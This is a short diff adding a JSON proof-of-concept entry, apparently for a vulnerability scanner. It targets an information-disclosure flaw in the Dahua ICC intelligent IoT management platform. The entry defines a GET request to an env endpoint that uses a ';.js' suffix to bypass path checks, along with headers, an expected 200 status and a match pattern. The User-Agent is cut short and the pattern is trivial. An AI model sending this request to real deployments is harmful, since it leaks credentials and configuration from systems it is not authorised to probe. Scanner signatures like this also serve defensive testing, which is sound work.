@@ -1,0 +1,14 @@
+{
+	"name":"大华ICC智能物联综合管理平台env敏感信息泄露",
+	"tag":"dahua",
+	"type":"other",
+	"poc":{
+		"pocGet":"/evo-apigw/dsc-mac/env;.js",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
